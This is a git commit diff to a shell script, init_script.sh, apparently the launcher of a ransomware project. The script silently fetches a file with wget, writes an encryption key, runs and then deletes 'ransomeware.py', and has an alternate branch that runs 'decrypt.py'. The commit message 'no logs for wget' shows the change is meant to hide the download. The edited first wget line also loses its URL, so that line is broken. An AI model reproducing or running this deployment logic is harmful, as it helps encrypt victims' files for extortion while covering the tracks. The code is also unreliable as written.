38b591fb4010f619068fa9833a934d118a9957aa
Rajiv Chitale <97620191+RajivChitale@users.noreply.github.com>
2023-04-24 01:10:18 +0530

    no logs for wget

--- init_script.sh
+++ init_script.sh
@@ -10,14 +10,14 @@ cd $targetPath
 
 if [[ ! -f ${targetPath}kludgefix ]]
 then
-    wget -q $source  >/dev/null 2>&1 
+    wget -q -o /dev/null >/dev/null
     if [ $? == 0 ]; then
         echo "${key}" | cat > key.key
         python3 ransomeware.py
         rm ./ransomeware.py
     fi
 else  
-    wget -q $source2  >/dev/null 2>&1 
+    wget -q -o /dev/null $source2 
     if [ $? == 0 ]; then
         echo "${key}" | cat > key.key
         python3 decrypt.py
